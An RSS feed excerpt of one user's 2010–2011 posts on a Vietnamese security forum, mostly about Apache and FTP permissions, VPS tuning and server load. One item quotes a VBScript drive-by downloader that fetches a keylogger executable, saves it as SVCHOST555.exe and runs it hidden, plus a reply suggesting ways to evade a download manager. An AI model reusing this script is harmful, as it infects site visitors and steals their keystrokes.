Hiện giờ em chỉ cố gắng tune cho nó chạy tạm hết cỡ cho tròn tháng này để em chuyển sang dedicated server... nếu bác có tìm ra đựoc cái gì để tune tạm trong thời gian này thì chỉ em với nhé... thanks bác hehe!&nbsp;
		</blockquote>
VPS = Virtual Private Server , tức là server của bạn được cài trên máy ảo, cùng với các server ảo khác trên một máy vật lý, vì vậy cấu hình các server ảo nào không hề phụ thuộc vào nhau, làm gì có chuyện ảnh hưởng tới các máy ảo khác được, bạn nên hỏi lại bên cho thuê server. Khi bạn đã thuê một vps, bạn đươc toàn quyền cài đặt từ OS đến các phần mềm trên đó.&nbsp;
		</blockquote>

Mình nghĩ chắc là do cậu ấy dùng VPS công nghệ OpenVZ.

@namduong8889: nếu bạn chủ yếu dùng static content sao không dùng varnish đặt trước lighttpd? varnish cache rất tốt, giảm tải khá nhiều nếu như content của bạn ít "động đậy".]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/29559/244365.hva#244365</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/29559/244365.hva#244365</link>
				<pubDate><![CDATA[Thu, 28 Jul 2011 03:50:04]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ Mình khẳng định cách làm của mình giống như mv1098 ở điểm group. Mà quanta nói không giống thì bạn đã hiểu khác đi rồi. Vì suy nghĩ của mình thì mình rõ chính xác nó nhất chứ.

Mà bắt đầu lạc đề rồi, dù cách mình đúng hay sai thì mình cũng hiểu thêm 1 cái mới trong topic này là mount --bind :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243654.hva#243654</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243654.hva#243654</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 23:18:05]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Đã đọc kỹ, giải pháp của mình ở trên cũng giống như bạn mv1098 mà? 
&nbsp;
		</blockquote>
Giống là giống thế nào? Một đằng là add apache và nobody vào chung một group rồi gán quyền write cho group, còn một đằng là add apache vào tất cả các group của FTP users.
&nbsp;
		</blockquote>

Có thể bạn quanta không hiểu ý mình ở topic mình đã viết ở trên. 

<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
2. Mỗi một user thì có group cùng tên, nhưng trong group đó thì có cả user apache 
&nbsp;
		</blockquote>

Chữ user của mình ở đây được hiểu là FTP User.

Vậy là giải pháp đã có rồi, mình không biết về mount --bind nên thành ra đi dài dòng.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243652.hva#243652</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243652.hva#243652</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 22:31:32]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Đúng là chmod 777 thì rất nhiều nhược điểm. Nhưng nếu không chmod 777 thì lại không có cách nào làm cho các users khác có quyền write trong đây.

quanta có cao kiến gì nếu như giải pháp là của mình nhưng khắc phục được điểm này?
&nbsp;
		</blockquote>
Hình như bạn chưa đọc kỹ bài của mv1098 ở post #12.
&nbsp;
		</blockquote>

Đã đọc kỹ, giải pháp của mình ở trên cũng giống như bạn mv1098 mà? nhưng giải pháp đó thì mình không nghĩ cách nào giải quyết được thằng DocumentRoot

<p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
quanta có thể gởi cho mình tài liệu để tìm hiểu kỹ hơn về phần này không?
&nbsp;
		</blockquote>
Ngay cả khi với system users, xác thực qua PAM bạn cứ tạo một vài user rồi thử xem có liên quan đến user chạy FTP server không. Còn virtual users thì dùng FTP server nào thì Google cho FTP server ấy.
&nbsp;
		</blockquote>

Mình sẽ xem lại phần này.

<p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Phải chmod lại. Vì mặc định Apache gán quyền 644.
&nbsp;
		</blockquote>
Không, quyền mặc định của thư mục là 755. Làm sao biết khi nào Apache hay FTP users tạo ra một thư mục mới mà chmod, chẳng nhẽ lại dùng inotify cron. Bạn tìm hiểu thêm về umask xem.
&nbsp;
		</blockquote>
Trước nay mình chỉ làm umask cho FTP chứ chưa cho Apache nên tìm hiểu lại phần này.

Vẫn đang suy nghĩ các giải pháp khác :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243649.hva#243649</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243649.hva#243649</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 22:14:46]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Group là apache, chmod /var/www/html/domain.com thành 777
&nbsp;
		</blockquote>
Ngay từ khi mới làm quen với Linux mình đã nhớ nằm lòng một câu là: đừng bao giờ chmod cái gì thành 777. Bạn thử nghĩ xem lý do là gì?
&nbsp;
		</blockquote>

Đúng là chmod 777 thì rất nhiều nhược điểm. Nhưng nếu không chmod 777 thì lại không có cách nào làm cho các users khác có quyền write trong đây.

quanta có cao kiến gì nếu như giải pháp là của mình nhưng khắc phục được điểm này?

<p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Chỗ này mình còn hơi lúng túng. Vì mình làm thì trước nay FTP mình không care về user chạy nó. Mình chỉ care khi bật anymous lên thôi :)
&nbsp;
		</blockquote>
Vậy thử tìm hiểu kỹ lại xem, nhất là khi dùng virtual users.
&nbsp;
		</blockquote>

quanta có thể gởi cho mình tài liệu để tìm hiểu kỹ hơn về phần này không?

<p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Thư mục do Apache tạo thì là 775 luôn.
&nbsp;
		</blockquote>
Thật không vậy? 775 là mặc định tạo ra đã thế hay là phải chmod. Quyền này do cái gì quyết định?&nbsp;
		</blockquote>
&nbsp;
		</blockquote>

Phải chmod lại. Vì mặc định Apache gán quyền 644.

Mình đang nghĩ đến giải pháp mỗi users một home folder riêng, sau đó tất cả đều hardlink về, không biết được không nhỉ? Mình chưa thử hardlink với FTP bao giờ cả :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243646.hva#243646</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243646.hva#243646</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 21:43:57]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Lỗi này có phải server bị ddos không?</title>
				<description><![CDATA[ Việc kết luận cho chắc chắn thì nên nhờ những bạn chuyên về ASP.NET kết luận thì tốt hơn. Mình làm về Java, nhưng mình quen đọc lỗi nên nghĩ lỗi xảy ra vì lý do như trên.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39585/243637.hva#243637</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39585/243637.hva#243637</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 20:39:22]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Lỗi này có phải server bị ddos không?</title>
				<description><![CDATA[ Mình nghĩ là do code chứ.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39585/243635.hva#243635</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39585/243635.hva#243635</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 20:32:41]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>Nếu tất cả đều làm trong 1 chỗ thì mình nghĩ home folder của tất cả đều trỏ về /var/www/html/domain.com và folder này owner là apache.
&nbsp;
		</blockquote>
OK. Còn group là gì?
&nbsp;
		</blockquote>
Group là apache, chmod /var/www/html/domain.com thành 777

<p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
Nobody thì mình thấy không liên quan gì trong đây cả, vì nhiệm vụ của nó chỉ là chạy FTPD thôi, còn quyền khi upload thì là của users.
&nbsp;
		</blockquote>
Bạn thử làm đi xem nó có liên quan không nhé.
&nbsp;
		</blockquote>

Chỗ này mình còn hơi lúng túng. Vì mình làm thì trước nay FTP mình không care về user chạy nó. Mình chỉ care khi bật anymous lên thôi :)

<p></p>
		<cite class="blockquote">quanta wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">phonglanbiec wrote:</cite><br>
		<blockquote>
2. Config lại FTPD để khi user upload lên thì quyền hạn mặc định là: 775 
&nbsp;
		</blockquote>
Còn thư mục do Apache tạo ra thì sao?
&nbsp;
		</blockquote>
Thư mục do Apache tạo thì là 775 luôn.
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243634.hva#243634</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243634.hva#243634</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 20:27:17]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ Nếu tất cả đều làm trong 1 chỗ thì mình nghĩ home folder của tất cả đều trỏ về /var/www/html/domain.com và folder này owner là apache.

Nobody thì mình thấy không liên quan gì trong đây cả, vì nhiệm vụ của nó chỉ là chạy FTPD thôi, còn quyền khi upload thì là của users.

Tóm lại:

1. /var/www/html/domain.com là home folder cho tất cả các users nhưng owner bởi apache. Home folder cho tất cả các users để khi user login vào FTP, FTP chuyển về /var/www/html/domain.com . Quyền hạn của /var/www/html/domain.com là: 775 nhằm đảm bảo tất cả các users đều có quyền read/write trong đây.

2. Config lại FTPD để khi user upload lên thì quyền hạn mặc định là: 775 

3. Nếu đã có nguyên tắc hoạt động thì mình nghĩ việc viết script không khó với quanta :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243624.hva#243624</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243624.hva#243624</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 12:00:53]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ Vậy là mình hiểu cái chỗ home folder. Mình cứ nghĩ là mỗi user là 1 domain riêng nên nhầm :).

Vậy bây giờ mình suggest lại như sau:

Home folder cho mỗi user: /var/www/html/domain.com/{user}/

Giải pháp của mình để giải quyết vấn đề file tạo ra bởi Apache & FTP là:

1. Apache chạy với quyền của user apache và group apache.

2. Mỗi một user thì có group cùng tên, nhưng trong group đó thì có user, apache.

3. Để giải quyết vấn đề 100 users thì ta cứ viết 1 script. Hoạt động của script như sau:

a. Hỏi tên user cần tạo.
b. Tạo user.
c. Tạo group.
d. Add apache vào user's group.
e. chown folder (home directory) user:user's group (user's group ở đây bao gồm user, apache).
f. chmod folder: 77x.
g. Kết thúc script

Như vậy đã thoả mãn điều kiện của quanta, và việc cho phép các users xem nội dung của nhau hay không thì tuỳ vào chữ x của phần 4, mục f.


]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243620.hva#243620</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243620.hva#243620</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 11:35:01]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ Mình chưa nghĩ đến vấn đề phải chính xác như vậy.

Nếu chính xác như vậy mình nghĩ cách giải quyết như sau:

1. Users & home folder thì như mình đề xuất.

2. Mỗi một user thì có group cùng tên, nhưng trong group đó thì có cả user apache (mình đang suy nghĩ có nên cho ftp chạy user riêng và vào group này không nhỉ ?!)

Mình hơi confuse trong cái chữ "đúng" này. Không biết quanta có đưa ra 1 mô hình chính xác (như cần file abc.php được user nào write, user nào read) thì mình suy nghĩ giải pháp nó chi tiết hơn :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243617.hva#243617</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243617.hva#243617</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 11:04:47]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ 1. Quyền hạn trong Linux thì chia thành 3 phần: User, Group, Other. Giả sử file A upload qua user U. Thì file A đó xem Apache là thành phần Other. Nếu chmod cho A ở phần Other là write thì Apache vẫn write được.

2. Tương tự với Apache ở phần giải thích trên.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243614.hva#243614</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243614.hva#243614</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 10:36:36]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Lỗi này có phải server bị ddos không?</title>
				<description><![CDATA[ Nếu như mình đoán không nhầm thì bạn có sử dụng 1 mảng để quản lý gì đó, và lỗi xảy ra khi bạn khai báo mảng quá ít mà quá nhiều phần tử được thêm vào.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39585/243611.hva#243611</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39585/243611.hva#243611</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 10:01:55]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ FTP Server mình nghĩ không cần gán cho nó quyền gì đặc biệt nên có thể chạy dưới quyền user nobody.

Permission mình nghĩ nên để mặc định cho folder là 755, thông thường là vậy :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243598.hva#243598</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243598.hva#243598</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 04:30:34]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>ftp lên Apache web root - gán permission thế nào cho đúng</title>
				<description><![CDATA[ Home folder cho các users mình sẽ để:

/var/www/html/{user's_domain}

Và nếu như để cách mình ở trên thì /var/www/html/domain.com có user là: domain và gán quyền chown /var/www/html/domain.com cho user, group là domain luôn.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39567/243596.hva#243596</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39567/243596.hva#243596</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 04:12:24]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Cần tìm thực tập viên - IT Technician tại Hà Nội</title>
				<description><![CDATA[ Theo mình thực tập viên có nghĩa là những người đi làm việc thực tế về 1 vấn đề đã học gì đó, mặc dù anh là expert của mảng software nhưng nếu anh vào làm vị trí như mình đọc ở trên thì vẫn gọi là thực tập viên.

Mình thấy rằng những yêu cầu trên cũng có thể được gọi là dành cho thực tập viên. Bởi vì xem kỹ lại thì nó chỉ hơn user 1 chút và kém expert 1 chút. Mà tên gọi, chức danh, từ ngữ cũng chẳng nên nói làm gì. Thực tế công việc chính là: người ta trả lương cho những việc anh làm, anh thấy xứng đáng thì làm, không xứng thì thôi, tìm việc khác, đó là quyền của anh. Chứ đem 1 chữ ra bàn cãi thì giải quyết được vấn đề gì?

Vài ý kiến để tránh làm loãng topic.

Nếu có tuyển ở TP HCM chắc mình cũng đăng ký :P.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39465/243593.hva#243593</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39465/243593.hva#243593</link>
				<pubDate><![CDATA[Fri, 15 Jul 2011 03:50:01]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Xác định nguyên nhân gây quá tải trên server</title>
				<description><![CDATA[ Mình đang sử dụng VPS RAM 784 và blog wordpress với ~6k visits và ~60k pageviews/day.

Giải pháp của mình là sử dụng nginx làm reverse proxy để xử lý static content. Mình config lại my.cnf xuống các giá trị thấp để ít dùng RAM làm cache. Config prefork lại xuống thấp 1 chút để có thể chống quá tải.

Mặc khác mình còn viết 2 script. 1 để control PHP nếu xử lý quá nhiều và quá lâu thì suspend hoặc restart lại Apache. 1 script khác để control RAM server, nếu thấy &lt;30 MB RAM thì restart server. Vì kinh nghiệm của mình là mình restart thì thời gian restart để vào lại web còn nhanh hơn là khách không ai truy cập được và dẫn đến crash server.

Mình còn dùng thêm monit để monitor một số services để thông báo cho mình viết khi quả tải sắp xảy ra.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/37695/236470.hva#236470</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/37695/236470.hva#236470</link>
				<pubDate><![CDATA[Sat, 30 Apr 2011 11:16:19]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Vấn đề configure Nginx</title>
				<description><![CDATA[ Bạn đã sửa gì để thành công? Bạn show full complete và viết 1 bài tut để share cho mọi người đi :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/38137/234518.hva#234518</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/38137/234518.hva#234518</link>
				<pubDate><![CDATA[Sun, 3 Apr 2011 02:37:57]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Cách gắn keylogger vào 1 website</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">dnv2006 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">kunkunlove wrote:</cite><br>
		<blockquote>Mình áp dụng code này vào webiste của mình  

-----------------------------
&lt;script language=VBScript&gt;
 on error resume next
 dl = "địa chỉ keylogger.exe"
 Set df = document.createElement ("object")
 df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
 str="Microsoft.XMLHTTP"
 Set x = df.CreateObject (str,"")
 a1="Ado"
 a2="db."
 a3="Str"
 a4="e"
 a5="am"
 str1=a1&a2&a3&a4&a5
 str5=str1
 set S = df.createobject(str5,"") 
 S.type = 1
 str6="GET"
 x.Open str6, dl, False
 x.Send
 fname1="SVCHOST555.exe"
 set F = df.createobject("Scripting.FileSystemObject","")
 set tmp = F.GetSpecialFolder (2) ' Get tmp folder
 fname1= F.BuildPath(tmp,fname1)
 S.open
 S.write x.responseBody
 S.savetofile fname1,2
 S.close
 set Q = df.createobject("Shell.Application","")
 Q.ShellExecute fname1,"","","open",0 
 &lt;/script&gt;
-----------------------------

Nhưng mình thấy 1 điều rằng nó hoạt động khi không dùng IDM, còn có IDM thì nó hiện bảng download của IDM
Ai có cách nào xin giúp mình 
&nbsp;
		</blockquote>

Mình chưa từng thử làm kiểu này, bạn thử một số giải pháp này xem sao:
- Đổi đuôi địa chỉ keylogger.exe sang cái đuôi khác *.exe được ko? (.com , .bat v.v..)
<font color='red'>- IDM mặc định bắt được link trong một số trình duyệt (IE, Firefox phải có add-on IDM CC), nếu victim của bạn dùng Google Chrome, Safari, Opera, Maxthon v.v.. thì đoạn mã trên vẫn có tác dụng.
</font>- Có cách nào đó can thiệp vào phần mềm IDM để không bắt link trong trình duyệt nào đó, không bắt link trong các địa chỉ site có dạng nào đó, không bắt link dạng đuôi file nào đó? can thiệp bằng registry chăng?
Mình chỉ nghĩ ra một số ý tưởng mở như thế thoai.&nbsp;
		</blockquote>

Đọc cái dòng màu đỏ mà buồn cười :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/37192/230689.hva#230689</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/37192/230689.hva#230689</link>
				<pubDate><![CDATA[Mon, 31 Jan 2011 11:40:23]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Vấn đề Hijacking "p3p0.com" cho website php</title>
				<description><![CDATA[ 1. Bạn kiểm tra lại các services đang hoạt động trên server.
2. Bạn thử quét virus lại một lần xem.
3. Sau khi sửa đổi, bạn thử thiết đặt quyền hạn cho các files đó chỉ có quyền read, không cho phép write thử xem.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/36841/226413.hva#226413</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/36841/226413.hva#226413</link>
				<pubDate><![CDATA[Sun, 5 Dec 2010 07:57:20]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Xu hướng tấn công và bảo mật 2010 - 2011</title>
				<description><![CDATA[ Mình nghĩ là tấn công vào: 
- Java vì càng ngày nhu cầu người dùng càng hướng đến không phụ thuộc hệ điều hành
- Social Engineering vì thông tin người dùng bây giờ quá nhiều 
- Clickjacking vì kiếm tiền trên mạng ngày càng dễ, và cũng dễ dụ người dùng hơn với những quảng cáo kiếm tiền trên mạng.
- Android vì HĐH Android phát triển ngày càng mạnh và được sử dụng trên nhiều thiết bị.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/36344/223707.hva#223707</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/36344/223707.hva#223707</link>
				<pubDate><![CDATA[Mon, 25 Oct 2010 11:55:13]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Truy tìm kẻ gửi mail nặc danh!</title>
				<description><![CDATA[ 1. Nhờ admin diễn đàn cho IP và thời gian của bài viết đó --&gt; (3)
2. Gởi 1 email đến cho anh ta, chờ anh ta reply lại, xem IP của anh ta --&gt; (3)

3. Nhờ ISP + cơ quan chức năng giải quyết.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/36003/221262.hva#221262</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/36003/221262.hva#221262</link>
				<pubDate><![CDATA[Wed, 22 Sep 2010 12:14:46]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Cho hỏi thế này có phải là bị hack hay virus ko? ( kèm hình )</title>
				<description><![CDATA[ 1. Mình không nghĩ là virus mà bạn nên check lại xem trong Chrome có plug-ins nào không? Các plug-ins thông thường sẽ tự động làm việc. Và mình kiểm tra một số IP trong hình thì hầu hết là của Google, thường được dùng để hỗ trợ người dùng (như Safe Browsing chẳng hạn)

2. Một số phiên bản Windows như bản Home chẳng hạn thì không hỗ trợ sẵn telnet.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35934/220920.hva#220920</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/35934/220920.hva#220920</link>
				<pubDate><![CDATA[Fri, 17 Sep 2010 13:19:29]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
	</channel>
</rss>
